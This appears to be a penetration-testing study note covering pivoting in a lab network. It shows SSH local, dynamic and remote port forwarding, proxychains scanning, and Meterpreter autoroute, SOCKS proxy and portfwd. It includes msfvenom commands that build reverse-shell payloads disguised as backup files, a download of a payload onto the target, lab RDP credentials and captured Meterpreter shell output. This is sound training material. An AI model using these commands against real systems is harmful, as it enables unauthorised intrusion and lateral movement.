# Dynamic - Remote - Meterpreter Tunneling & Port Forwarding

## 1.Dynamic Port Forwarding with SSH and SOCKS Tunneling

### SSH Local Port Forwarding

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FFeu3S3k3lSmI4CHOOnWO%2Fimage.png?alt=media&amp;token=cd8d4634-579b-4b07-968c-4fbac06d1741" alt=""><figcaption></figcaption></figure>

### Scanning the Pivot Target

```shell-session
nmap -sT -p22,3306 10.129.202.64
```

### Executing the Local Port Forward

```shell-session
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

### Confirming Port Forward with Netstat

```shell-session
netstat -antp | grep 1234
```

### **Confirming Port Forward with Nmap**

```shell-session
nmap -v -sV -p1234 localhost
```

* Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the `local port:server:port` argument to your ssh command.

## **Forwarding Multiple Ports**

```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

### Setting up to Pivot

Now, if you type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:

* One connected to our attack host (`ens192`)
* One communicating to other hosts within a different network (`ens224`)
* The loopback interface (`lo`).

### Looking for Opportunities to Pivot using ifconfig.

```shell-session
ifconfig
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FG7MxayrrSEJKEv6Ywzjv%2Fimage.png?alt=media&amp;token=6da74bb9-0402-47d1-b547-091c1234fec9" alt=""><figcaption></figcaption></figure>

### Enabling Dynamic Port Forwarding with SSH

```shell-session
ssh -D 9050 ubuntu@10.129.202.64
```

**Checking /etc/proxychains.conf**

```shell-session
tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

* Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.

### Using Nmap with Proxychains

```shell-session
proxychains nmap -v -sn 172.16.5.1-200
```

### Enumerating the Windows Target through Proxychains

```shell-session
proxychains nmap -v -Pn -sT 172.16.5.19
```

## Using Metasploit with Proxychains

```shell-session
proxychains msfconsole
```

* Let's use the `rdp_scanner` auxiliary module to check if the host on the internal network is listening on 3389.

### Using rdp\_scanner Module

```shell-session
msf6 > search rdp_scanner
msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
rhosts => 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
```

### **Using xfreerdp with Proxychains**

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### **Successful RDP Pivot**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fjw7qZrbdJHUGq1nakWZU%2Fimage.png?alt=media&amp;token=3af90353-d58c-4a86-a252-ff75dd3e407d" alt=""><figcaption></figcaption></figure>

## 2.Remote/Reverse Port Forwarding with SSH

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqWgqanmB9IHFisgOwc1v%2Fimage.png?alt=media&amp;token=846dca0b-f686-48ed-8967-53c9420d73e8" alt=""><figcaption></figcaption></figure>

### **Creating a Windows Payload with msfvenom**

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### **Configuring & Starting the multi/handler**

```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

### Transferring Payload to Pivot Host

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

* After copying the payload, we will start a `python3 HTTP server`

### **Starting Python3 Webserver on Pivot Host**

```shell-session
python3 -m http.server 8123
```

### Downloading Payload on the Windows Target

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

> Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

### Using SSH -R

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

### Viewing the Logs from the Pivot

```shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

* If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

### **Meterpreter Session Established**

```shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Our Meterpreter session should list that our incoming connection is from a local host itself (`127.0.0.1`) since we are receiving the connection over the `local SSH socket`, which created an `outbound` connection to the Ubuntu server. Issuing the `netstat` command can show us that the incoming connection is from the SSH service.

* The below graphical representation provides an alternative way to understand this technique.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FLmAfzufzynqyaopyGWSr%2Fimage.png?alt=media&amp;token=19a22c6a-2d03-4201-ac66-e536c3a4de10" alt=""><figcaption></figcaption></figure>

## 3.Meterpreter Tunneling & Port Forwarding

### Creating Payload for Ubuntu Pivot Host

```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

### Configuring & Starting the multi/handler

```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and execute it to gain a Meterpreter session.

### Executing the Payload on the Pivot Host

```shell-session
buntu@WebServer:~$ ls

backupjob

ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

* We need to make sure the Meterpreter session is successfully established upon executing the payload.

### Meterpreter Session Establishment

```shell-session
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

> We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the `ping_sweep` module, which will generate the ICMP traffic from the Ubuntu host to the network `172.16.5.0/23`.

### Ping Sweep

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

* We could also perform a ping sweep using a `for loop` directly on a target pivot host that will ping any device in the network range we specify.

### **Ping Sweep For Loop on Linux Pivot Hosts**

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

### Ping Sweep For Loop Using CMD

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### **Ping Sweep Using PowerShell**

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

> **Note:** It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

### **Configuring MSF's SOCKS Proxy**

```shell-session
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
msf6 auxiliary(server/socks_proxy) > options
```

### Confirming Proxy Server is Running

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs
```

> After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our `proxychains.conf` file located at `/etc/proxychains.conf` if it isn't already there.

### Adding a Line to proxychains.conf if Needed

```shell-session
sudo nano /etc/proxychains.conf
socks4 	127.0.0.1 9050
```

> Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

* Finally, we need to tell our socks\_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

### **Creating Routes with AutoRoute**

```shell-session
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

* It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```

* After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.

### **Listing Active Routes with AutoRoute**

```shell-session
meterpreter > run autoroute -p
```

```shell-session
Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.

### **Testing Proxy & Routing Functionality**

```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## Port Forwarding

> Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

**Portfwd options**

```shell-session
meterpreter > help portfwd
```

### **Creating Local TCP Relay**

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

> The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

### **Connecting to Windows Target through localhost**

```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Netstat Output**

```shell-session
netstat -antp
```

## Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.

### **Reverse Port Forwarding Rules**

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

### **Configuring & Starting multi/handler**

```shell-session
meterpreter > bg
msf6 exploit(multi/handler) > set LPORT 8081 
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```

> We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.

### **Generating the Windows Payload**

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.

### **Establishing the Meterpreter session**

```shell-session
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```
